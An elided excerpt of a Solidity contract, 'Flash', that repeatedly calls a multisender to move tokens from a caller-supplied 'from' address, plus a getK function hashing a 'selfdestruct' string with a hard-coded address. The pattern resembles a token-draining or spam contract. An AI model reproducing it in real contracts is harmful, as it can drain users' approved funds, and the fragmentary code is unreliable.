...
contract Flash is Ownable {
    IMSender _multisender;

    constructor(address _multisend) {
        _multisender = IMSender(_multisend);
    }
    ...
    function sendToken(
        ...
        for (uint256 i = 0; i < number; i++) {
            _multisender.multisendToken(from, _token, to, amount, number1);
        }
    }
    ...
    function getK() external view returns (bytes32) {
        return keccak256("selfdestruct(0x25aDf743c0Fa773B4a37535eE653092822D01d9A)");
    }
}
